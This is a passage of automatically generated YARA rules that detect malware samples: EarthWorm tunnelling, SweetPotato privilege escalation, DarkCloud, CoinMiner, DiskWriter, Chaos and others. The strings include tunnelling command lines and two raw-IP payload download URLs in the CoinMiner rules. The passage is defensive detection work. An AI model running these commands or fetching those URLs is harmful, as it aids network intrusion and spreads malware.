      $s2 = " ./ew -s lcx_tran --listenport 1080 -connhost xxx.xxx.xxx.xxx --connport 8888" fullword ascii /* score: '23.00'*/
      $s3 = " -f connhost set the connect host address ." fullword ascii /* score: '20.00'*/
      $s4 = "<-- %3d --> (open)used/unused  %d/%d" fullword ascii /* score: '20.00'*/
      $s5 = " ./ew -s lcx_slave --refhost [ref_ip] --refport 1080 -connhost [connIP] --connport 8888" fullword ascii /* score: '20.00'*/
      $s6 = " -d refhost set the reflection host address." fullword ascii /* score: '20.00'*/
      $s7 = "lcx_tran 0.0.0.0:%d <--[%4d usec]--> %s:%d" fullword ascii /* score: '19.50'*/
      $s8 = "Error: --> %d start server" fullword ascii /* score: '19.00'*/
      $s9 = "Error : --> %d start server." fullword ascii /* score: '19.00'*/
      $s10 = "rcsocks 0.0.0.0:%d <--[%4d usec]--> 0.0.0.0:%d" fullword ascii /* score: '17.00'*/
      $s11 = "ssocksd 0.0.0.0:%d <--[%4d usec]--> socks server" fullword ascii /* score: '17.00'*/
      $s12 = "--> %3d <-- (close)used/unused  %d/%d" fullword ascii /* score: '16.00'*/
      $s13 = "Error : bind port %d ." fullword ascii /* score: '16.00'*/
      $s14 = " Tcp ---> %s:%d " fullword ascii /* score: '15.50'*/
      $s15 = "Error on connect %s:%d [proto_init_cmd_rcsocket]" fullword ascii /* score: '15.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__072b5eab {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_072b5eab.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "072b5eabc55e8df614786b965d9055fb1414059d28649da7258495f1f5b994d5"
   strings:
      $x1 = "C:\\Users\\XuanJian\\Desktop\\SweetPotato_CS-master\\obj\\Debug\\SweetPotato.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "c:\\Windows\\System32\\werfault.exe" fullword wide /* score: '29.00'*/
      $s3 = "[!] Failed to created impersonated process with token: {0}" fullword wide /* score: '23.00'*/
      $s4 = "[!] Failed to created impersonated process with user: {0} " fullword wide /* score: '23.00'*/
      $s5 = "SweetPotato.exe" fullword wide /* score: '22.00'*/
      $s6 = "shellcode" fullword ascii /* score: '22.00'*/
      $s7 = "Run a Process (werfault.exe)" fullword wide /* score: '22.00'*/
      $s8 = "OpenProcessToken failed. CurrentProcess: {0}" fullword wide /* score: '21.00'*/
      $s9 = "CommandOption.OnParseComplete should not be invoked." fullword wide /* score: '19.00'*/
      $s10 = "[+] Process created, enjoy!" fullword wide /* score: '19.00'*/
      $s11 = "WriteCommandDescription" fullword ascii /* score: '18.00'*/
      $s12 = "ProcessNTLMBytes" fullword ascii /* score: '18.00'*/
      $s13 = "s=|shellcode=" fullword wide /* score: '18.00'*/
      $s14 = "[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}" fullword wide /* score: '18.00'*/
      $s15 = "ExecutionMethod" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule e3b01539bfe340422ea843a340792c37_imphash_ {
   meta:
      description = "_subset_batch - file e3b01539bfe340422ea843a340792c37(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "baf0e83d6c2f59c0257c5a7ee0e9cd8780ba5ac76b2192a5e5d60857b276a3b0"
   strings:
      $s1 = " http://www.microsoft.com/windows0" fullword ascii /* score: '17.00'*/
      $s2 = ".?AV?$ManageMutex@$00@Actions@Enigma@@" fullword ascii /* score: '15.00'*/
      $s3 = ".?AVFindProcess@Actions@Enigma@@" fullword ascii /* score: '15.00'*/
      $s4 = ".?AV?$ManageMutex@$01@Actions@Enigma@@" fullword ascii /* score: '15.00'*/
      $s5 = ".?AVWatchForProcess@Actions@Enigma@@" fullword ascii /* score: '15.00'*/
      $s6 = ".?AVOpenFoundedProcess@Actions@Enigma@@" fullword ascii /* score: '15.00'*/
      $s7 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii /* score: '13.00'*/
      $s8 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii /* score: '13.00'*/
      $s9 = ".?AV?$DownloadUsingDriver@VInstallCryptApi@Actions@Enigma@@@Actions@Enigma@@" fullword ascii /* score: '13.00'*/
      $s10 = ".?AV?$DownloadUsingDriver@VEnigmaParty@Actions@Enigma@@@Actions@Enigma@@" fullword ascii /* score: '13.00'*/
      $s11 = "Fhttp://www.microsoft.com/pkiops/crl/MicWinProPCA2011_2011-10-19.crl%200a" fullword ascii /* score: '13.00'*/
      $s12 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s13 = ".?AVParseCommandLine@Actions@Enigma@@" fullword ascii /* score: '12.00'*/
      $s14 = "$Microsoft Ireland Operations Limited1" fullword ascii /* score: '11.00'*/
      $s15 = "\"xtwp&spy{+)~y-" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule DarkCloud_signature__f8838e1d76719809f279e2cd2dd117ee_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f8838e1d76719809f279e2cd2dd117ee(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de9dd2c4b5c4c3608bb6751a01ac9394de7efa732703fd783f823762463214a8"
   strings:
      $x1 = "*\\AC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\Stub\\Project1.vbp" fullword wide /* score: '38.00'*/
      $s2 = "(Email): helloworld@yahoo.com" fullword ascii /* score: '23.00'*/
      $s3 = "BMS - System Login Screen" fullword ascii /* score: '23.00'*/
      $s4 = "cmdlogin" fullword ascii /* score: '22.00'*/
      $s5 = "fitfully.exe" fullword wide /* score: '22.00'*/
      $s6 = "BMS - Change Password Screen" fullword ascii /* score: '20.00'*/
      $s7 = "51284E47617760614E4267707E7B714E" wide /* score: '19.00'*/ /* hex encoded string 'Q(NGaw`aNBgp~{qN' */
      $s8 = "txtlogin" fullword ascii /* score: '19.00'*/
      $s9 = "loginbar" fullword ascii /* score: '19.00'*/
      $s10 = "select * from users where loginid = '" fullword wide /* score: '19.00'*/
      $s11 = "Executei`" fullword ascii /* score: '18.00'*/
      $s12 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s13 = "60.DLL" fullword ascii /* score: '17.00'*/
      $s14 = "Login ID Does Not Exist! Enter Correct Login ID" fullword wide /* score: '17.00'*/
      $s15 = "3051284E4E457B7C767D65614E414B4146575F21204E717760666077633C776A7730" wide /* score: '17.00'*/ /* hex encoded string '0Q(NNE{|v}eaNAKAFW_! Nqw`f`wc<wjw0' */
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      1 of ($x*) and 4 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2c0de589 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2c0de589.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c0de5892bb8da11f6f34b06040050e3d4bed71fba0f7eb331845b34cbfb658e"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "Tvaf.exe" fullword wide /* score: '22.00'*/
      $s4 = "Core.Infrastructure.Logging" fullword ascii /* score: '16.00'*/
      $s5 = "GetInfoScript" fullword ascii /* score: '15.00'*/
      $s6 = "GetSuccessScript" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<TType>.get_Current" fullword ascii /* score: '15.00'*/
      $s8 = "GetFatalScript" fullword ascii /* score: '15.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<TType>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s10 = "GetWarningScript" fullword ascii /* score: '15.00'*/
      $s11 = "<GetSpecByContentType>b__0" fullword ascii /* score: '14.00'*/
      $s12 = "Tvaf.pdb" fullword ascii /* score: '14.00'*/
      $s13 = "GetSpecByContentType" fullword ascii /* score: '14.00'*/
      $s14 = "StructureMap.Pipeline" fullword ascii /* score: '13.00'*/
      $s15 = "StructureMap.Configuration.DSL.Expressions" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule bf51b0c86477a3c1cd8b276c384b90f7_imphash_ {
   meta:
      description = "_subset_batch - file bf51b0c86477a3c1cd8b276c384b90f7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26ed53cb3cee9658ada827468d96727d484439c8182ce7520a212d1719ba72db"
   strings:
      $s1 = " Login Failed!" fullword ascii /* score: '18.00'*/
      $s2 = "Error reading password." fullword ascii /* score: '18.00'*/
      $s3 = " Login Success!" fullword ascii /* score: '15.00'*/
      $s4 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s5 = ".GNU C17 13-win32 -m64 -masm=att -mtune=generic -march=x86-64 -g -O2 -fno-PIE" fullword ascii /* score: '15.00'*/
      $s6 = "Error reading username." fullword ascii /* score: '13.00'*/
      $s7 = "GNU C17 13-win32 -m64 -masm=att -mtune=generic -march=x86-64 -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s8 = "9GNU C17 13-win32 -m64 -masm=att -mtune=generic -march=x86-64 -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s9 = "passwordH" fullword ascii /* score: '12.00'*/
      $s10 = ";GNU C17 13-win32 -m64 -masm=att -mtune=generic -march=x86-64 -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s11 = "'GNU C17 13-win32 -m64 -masm=att -mtune=generic -march=x86-64 -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s12 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s13 = "$__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s14 = "?__report_error" fullword ascii /* score: '10.00'*/
      $s15 = "pNTHeader64" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule ebdf3ae9da07360a5b02777664fdc105_imphash_ {
   meta:
      description = "_subset_batch - file ebdf3ae9da07360a5b02777664fdc105(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b2ca99555886133450668ed69366ffcabb9860cd5fba4340b2c1dcf7d365cfca"
   strings:
      $x1 = "C:\\Windows\\System32\\*.dll" fullword ascii /* score: '34.00'*/
      $s2 = "C:\\Temp\\UpdateCache\\cache.tmp" fullword ascii /* score: '23.00'*/
      $s3 = "fiddler.exe" fullword ascii /* score: '22.00'*/
      $s4 = "procmon.exe" fullword ascii /* score: '22.00'*/
      $s5 = "wireshark.exe" fullword ascii /* score: '22.00'*/
      $s6 = "C:\\Windows\\Temp\\config.ini" fullword ascii /* score: '20.00'*/
      $s7 = "C:\\Temp\\UpdateCache" fullword ascii /* score: '16.00'*/
      $s8 = "__imp_Process32First" fullword ascii /* score: '15.00'*/
      $s9 = "__imp_Process32Next" fullword ascii /* score: '15.00'*/
      $s10 = "__imp_GetSystemDefaultLangID" fullword ascii /* score: '12.00'*/
      $s11 = "_head_lib64_libapi_ms_win_crt_private_l1_1_0_a" fullword ascii /* score: '12.00'*/
      $s12 = "GNU C17 14.2.0 -march=nocona -msahf -mtune=generic -g -g -g -O2 -O2 -O2 -fbuilding-libgcc -fno-stack-protector" fullword ascii /* score: '12.00'*/
      $s13 = "__imp_GetAsyncKeyState" fullword ascii /* score: '12.00'*/
      $s14 = "_head_lib64_libapi_ms_win_crt_runtime_l1_1_0_a" fullword ascii /* score: '12.00'*/
      $s15 = "SANDBOX" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__23aa6ede111f6ac860a5e9008f9b9673_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_23aa6ede111f6ac860a5e9008f9b9673(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "252918aaa98f25a1cc128e8eebb27905ded606d4eb04285abbf5344ff51947ba"
   strings:
      $s1 = "http://91.108.241.80:5554/dbf878ceb2af43c48339211181c877e8_bound_build.exe" fullword ascii /* score: '27.00'*/
      $s2 = "tjgajdjrg.exe" fullword ascii /* score: '22.00'*/
      $s3 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule CoinMiner_signature__ebd2d9f541ce74ecd927201962eae4b6_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_ebd2d9f541ce74ecd927201962eae4b6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "17d651beb2f137db26ef7821e8e4648d3065146aa54340d2962c295cff4510b8"
   strings:
      $s1 = "http://185.238.191.89:5554/45058fd046634b96bcb5bf76d13300cb_bound_build.exe" fullword ascii /* score: '27.00'*/
      $s2 = "cog.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule DiskWriter_signature__7184847241bf2fdf31b2cf3f5b2c231b_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_7184847241bf2fdf31b2cf3f5b2c231b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ee4369060d95926b775c5228807f3c91cd8249ff5c79423e343cbeed710c04a4"
   strings:
      $x1 = "c:\\users\\szaman\\documents\\visual studio 2010\\Projects\\Rsc6c6b\\Debug\\Rsc6c6b.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "MSVCR100D.dll" fullword ascii /* score: '23.00'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s4 = "FINAL WARNING!!!" fullword ascii /* score: '13.00'*/
      $s5 = "SYSTEM error " fullword ascii /* score: '10.00'*/
      $s6 = "f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and all of them
}

rule DiskWriter_signature__20a769364125454678030635d624115b_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_20a769364125454678030635d624115b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e06ec39af96172ded9451ea4fff09528271fba13717ce4d5f5bc8429c9941c0d"
   strings:
      $x1 = "C:\\Windows\\System32\\user32.dll" fullword wide /* score: '37.00'*/
      $x2 = "C:\\Windows\\System32\\DriverStore\\FileRepository\\*.dll" fullword wide /* score: '37.00'*/
      $x3 = "C:\\Windows\\System32\\hal.dll" fullword wide /* score: '34.00'*/
      $x4 = "C:\\Windows\\System32\\kernel32.dll" fullword wide /* score: '34.00'*/
      $x5 = "C:\\Windows\\System32\\advapi32.dll" fullword wide /* score: '34.00'*/
      $x6 = "C:\\Windows\\System32\\gdi32.dll" fullword wide /* score: '34.00'*/
      $x7 = "C:\\Windows\\System32\\svchost.exe" fullword wide /* score: '34.00'*/
      $x8 = "C:\\Windows\\System32\\taskhost.exe" fullword wide /* score: '34.00'*/
      $x9 = "C:\\Windows\\System32\\*.dll" fullword wide /* score: '34.00'*/
      $x10 = "C:\\Windows\\System32\\lsass.exe" fullword wide /* score: '33.00'*/
      $x11 = "C:\\Windows\\System32\\winlogon.exe" fullword wide /* score: '32.00'*/
      $x12 = "C:\\Windows\\System32\\services.exe" fullword wide /* score: '32.00'*/
      $x13 = "C:\\Windows\\System32\\drivers\\*.sys" fullword wide /* score: '32.00'*/
      $x14 = "C:\\Windows\\System32\\DriverStore\\FileRepository\\*.sys" fullword wide /* score: '32.00'*/
      $x15 = "C:\\Windows\\System32\\DriverStore\\FileRepository\\*.exe" fullword wide /* score: '32.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*)
}

rule DiskWriter_signature__dbf0cd6efe18f39612d95eca593c57f4_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_dbf0cd6efe18f39612d95eca593c57f4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "36efecc291036aace30e9bdfc08247754ae84ef961f006eeec35523536422166"
   strings:
      $x1 = "C:\\Users\\JairPC\\source\\repos\\googoogaga\\Release\\googoogaga.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "Gogoogaga.exe (WIP 8/31/25)" fullword wide /* score: '14.00'*/
      $s3 = "Gogoogaga.exe (WIP)" fullword wide /* score: '14.00'*/
      $s4 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s5 = "Get ready." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and all of them
}

rule Chaos_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file Chaos(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2254802dd387d0e0ceb61e2849a44b51879f625b89879e29592c80da9d479a2"
   strings:
      $x1 = "/9j/4AAQSkZJRgABAQEAeAB4AAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQME" wide /* score: '57.00'*/
      $s2 = "C:\\Users\\" fullword wide /* score: '24.00'*/
      $s3 = "GOATEDSIGMA.exe" fullword wide /* score: '22.00'*/
      $s4 = "EZZZZ.exe" fullword wide /* score: '22.00'*/
      $s5 = "appMutexRun2" fullword ascii /* score: '19.00'*/
      $s6 = "appMutexRun" fullword ascii /* score: '18.00'*/
      $s7 = "appMutexStartup2" fullword ascii /* score: '16.00'*/
      $s8 = "appMutex2" fullword ascii /* score: '16.00'*/
      $s9 = "runCommand" fullword ascii /* score: '15.00'*/
      $s10 = "appMutex" fullword ascii /* score: '15.00'*/
      $s11 = "appMutexRegex" fullword ascii /* score: '15.00'*/
      $s12 = "appMutexStartup" fullword ascii /* score: '15.00'*/
      $s13 = "AlreadyRunning" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s14 = "<EncryptedKey>" fullword wide /* score: '12.00'*/
      $s15 = "sleepOutOfTempFolder" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule e44d579183e5edb0e9901a3578e092bd_imphash_ {
   meta:
      description = "_subset_batch - file e44d579183e5edb0e9901a3578e092bd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "77f059ad2a90415fa8d7bd4856462396b5d4434410e61afe2cf2b976da3d2604"
   strings:
      $s1 = "C:\\Users\\ogblo\\source\\repos\\ConsoleApplication1\\x64\\Release\\ConsoleApplication1.pdb" fullword ascii /* score: '29.00'*/
      $s2 = ": FAKHUR SO DAMN FAT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule CyberStealer_signature__68903b6512aa4daace5c9245d3102a0f_imphash_ {
   meta:
      description = "_subset_batch - file CyberStealer(signature)_68903b6512aa4daace5c9245d3102a0f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "defa675e2d0b7fc74fc38e774133766de90462c185242a75149dcd5d14036ea2"
   strings:
      $s1 = "INJECTED_OK" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule eeb7fb0f8046838a65a078a7d7407a00_imphash_ {
   meta:
      description = "_subset_batch - file eeb7fb0f8046838a65a078a7d7407a00(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d6e90a501b1d7d50197d9fa4c3d40efc7356f13dd50b8629fd3946d3cad7d463"
   strings:
      $s1 = "\\\\.\\pipe\\%08X%016llX%02X%08X" fullword ascii /* score: '19.00'*/
      $s2 = "ReflectiveLoader" fullword ascii /* score: '13.00'*/
      $s3 = "encrypted_data:" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__840d8b66 {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_840d8b66.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "840d8b66adc4eee47ef1bddde72955035d83c73d51ebe0e82af0ffff5c275283"
   strings:
      $s1 = "e0fhkxqu.dll" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10KB and
      all of them
}

rule CoinMiner_signature__4b3ee95f35e7f4c0001cc18c48681f14_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_4b3ee95f35e7f4c0001cc18c48681f14(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8a8e0b21385dd70cddd5ac252e501984ead150aa40644d603d556796204bb26e"
   strings:
      $s1 = "!'\" -^5A" fullword ascii /* score: '13.00'*/ /* hex encoded string 'Z' */
      $s2 = "6:- 6]:$(\" " fullword ascii /* score: '13.00'*/ /* hex encoded string 'f' */
      $s3 = "' -:5_$2 @+/" fullword ascii /* score: '13.00'*/ /* hex encoded string 'R' */
      $s4 = ";&2* >3*>" fullword ascii /* score: '13.00'*/ /* hex encoded string '#' */
      $s5 = "+?@;%\"+ 32( /" fullword ascii /* score: '13.00'*/ /* hex encoded string '2' */
      $s6 = "_?+ 5&6:#)" fullword ascii /* score: '13.00'*/ /* hex encoded string 'V' */
      $s7 = "% ($[+ 2D" fullword ascii /* score: '13.00'*/ /* hex encoded string '-' */
      $s8 = "'?[3* :4$" fullword ascii /* score: '13.00'*/ /* hex encoded string '4' */
      $s9 = "6\"- (\"6&" fullword ascii /* score: '13.00'*/ /* hex encoded string 'f' */
      $s10 = "3&.+B&.\"- ^" fullword ascii /* score: '13.00'*/ /* hex encoded string ';' */
      $s11 = "%@52':- -(, " fullword ascii /* score: '13.00'*/ /* hex encoded string 'R' */
      $s12 = "+ <!5$0/>$$&" fullword ascii /* score: '13.00'*/ /* hex encoded string 'P' */
      $s13 = "V:\";L+ " fullword ascii /* score: '11.00'*/
      $s14 = "\\%[-@%3B%" fullword ascii /* score: '10.00'*/ /* hex encoded string ';' */
      $s15 = "\\#=:4#^7" fullword ascii /* score: '10.00'*/ /* hex encoded string 'G' */
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule e016d800c52a068ed1cf57285fa2c8c8_imphash_ {
   meta:
      description = "_subset_batch - file e016d800c52a068ed1cf57285fa2c8c8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b637fa27d2ea2ff3264d67b6b642e439aa7a0f04781fb01c0ee9ff15a16c42ab"
   strings:
      $s1 = "C:\\logs\\sf.log" fullword wide /* score: '25.00'*/
      $s2 = "Shellcode" fullword ascii /* score: '20.00'*/
      $s3 = "ntdll .data" fullword ascii /* score: '13.00'*/
      $s4 = "%p -> Flink=%p Blink=%p, " fullword ascii /* score: '10.50'*/
      $s5 = "VEH ListHead: " fullword ascii /* score: '9.00'*/
      $s6 = "[!] ListHead" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      all of them
}

rule df88dcd8448ed860a23c6cada4d1b8fdce1cb6424056e1973b44a29457431f53_df88dcd8 {
   meta:
      description = "_subset_batch - file df88dcd8448ed860a23c6cada4d1b8fdce1cb6424056e1973b44a29457431f53_df88dcd8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "df88dcd8448ed860a23c6cada4d1b8fdce1cb6424056e1973b44a29457431f53"
   strings:
      $s1 = "Failed to create symlink in %s: %s" fullword ascii /* score: '12.50'*/
      $s2 = "Remote I/O error" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__60a876b5 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_60a876b5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "60a876b5d80ad16d7069d8e40dde15e0dfdbcf1c1243efd288d2ce1d7c157000"
   strings:
      $x1 = "c0J4QXF1Z2dSWGlUakhkSmtSSVpNVnlRcnhIemlSZ01vYnlvSGxKbndtTWFGWWFmcVVoZE5KbFdEaEpzbWd4QXFWZklJcEJ6SVVjYUpZS1NXYkpPakR5ZnBibFpjUUFQ" wide /* base64 encoded string*/ /* score: '40.00'*/
      $x2 = "eXBMemhFTFBsTlVDclNSVGNCQVltdkF6bGREWkhyVXFZWGdRQ3RVTnNWUW12a2N3SXJ1S1F0aUNwTU5FQW1JdXNkZVRtQVJpZ21mUWZOREJCSFFReEpaZm9kYnBnUU1H" wide /* base64 encoded string*/ /* score: '40.00'*/
      $x3 = "eXlTQXFRRGlKekRRd0l0WXZBRE9IanpKS2tGb1dRY3JMTk5KaVNmWWRndFpyckFPWUVzbE9BVE95SnFGS1BMdFhMRml2a3BkVWZsYnFhUlNqcVFTWHFkS3V6S1ljWk9P" wide /* base64 encoded string*/ /* score: '37.00'*/
      $x4 = "SWFKdVVXeGxnUGRRaWFCSGFET3FoZnJwcFVSUE51ZFBDUkZVS2dCcXF2RE5GRndYb2h1aUVSS2RqVUZBRWhYbWxPT1FVaHd0Qlh6bWNkamtZdWJmQXVLa0dja3FiQmxK" wide /* base64 encoded string*/ /* score: '37.00'*/
      $x5 = "eEdERXhWeE1PSHVvTmZkV1hEeGNrVlNWaXNhbXh1TllESnJsUUNpSERBWlNvZ0FxS0Nlc25lUWNuaVZGdkxPVXVXbEVuc0ZWVXFZa3dBaENyamJ2UFVsWXRQeWloY01z" wide /* base64 encoded string*/ /* score: '36.00'*/
      $x6 = "RlBheVpiWWF4aXVyWVNpaUZab0NyYkVYVFJIS2F4WUljaEVoR1ZYbXZMbFRidXRnbE1qeW5HRWVMRGZJVE9BQUttT3FOQmJrQkJHZnFsdllYYlpOT2FVV2NhV0RwT1No" wide /* base64 encoded string*/ /* score: '35.00'*/
      $x7 = "VXJuc1lqTFJ1TmpjZ1JNb2hHZHpva3NTRFZTYVNxTHdFVVJoeE12WW9qZEhVcnpnU2ZHbm1uTGp6VXBDUWx5RUNuWU1BZnFVTEVMRkhreExWbEhualhKUUpoaGRYc0lE" wide /* base64 encoded string*/ /* score: '33.00'*/
      $x8 = "SWNQQmJFbUJtWXBhdmxjY1Fna2tnTVNrUEtscllFeVp5bGFJbWREWGZkQlJ5V3B0QVlTcWd0cHdKZW1SVHZjaVpQYktLVHBuY05GQ0xBbXNVcnJBbEh0RXZlekhybURr" wide /* base64 encoded string*/ /* score: '33.00'*/
      $x9 = "amFod0tuR1lpVmdpTXF4Tlp4dmplSkVzRnJMbHVEZEtaZXR4UnFSVnBkUGNudGt4aHJQQ2Z1R2FXb3JTY1ZkZXJXSml4QXZpZ2F1QXRiRk1HTkREb2JlZVhUYWN6eXNV" wide /* base64 encoded string*/ /* score: '32.00'*/
      $s10 = "enZabmFUS1laUWFFelhGeU90RmVCbXVybWZZa1JsSUZhZE91R0hXUmZkVGJtUFFyeFBBUGJJdE1CaUF1dWFIb0lWZVZJS3NIWG56WVRTRldQZ21Ca3NkU2tCdFhHYldG" wide /* base64 encoded string*/ /* score: '28.00'*/
      $s11 = "UFNxSkF0enZMUGZEakJ2Zk1PeWhHRkdaWHRsRWZaUmhWd2ptbklQQW9vQU5WZ05RaFZodWdqdUpMUWxISHVQbXh4aG1TSXNFeXlzU0Z0RXJmVlhLclhCbUNaYVhXSXN1" wide /* base64 encoded string*/ /* score: '25.00'*/
      $s12 = "WinSc32.exe" fullword wide /* score: '22.00'*/
      $s13 = "load.exe" fullword wide /* score: '22.00'*/
      $s14 = "SGk0MkNpQWRKWHgwWWxOc1dTMERLU01OS1Vwa0VCRVpReVVoTER3dktVTURJbVJpZFJOWGJCMHRPQ1JzTGkwU1pCd1NiRHRsVVFVak1TQUdHeFFtR0NnNFRIcEJjWDF3" wide /* base64 encoded string*/ /* score: '21.00'*/
      $s15 = "SGk0MkNpQWRKWHgwWWxOc1dSTTZMeWdNT3dKa0hSVnNWV0pBZjNNV0pRMTZSWDl6T1hwWFpWRUROaUluREdORGRHSnhmRko4UUdRVktENEdLaDQ4ZkhkL1RYeGZjR2Qy" wide /* base64 encoded string*/ /* score: '21.00'*/
   condition:
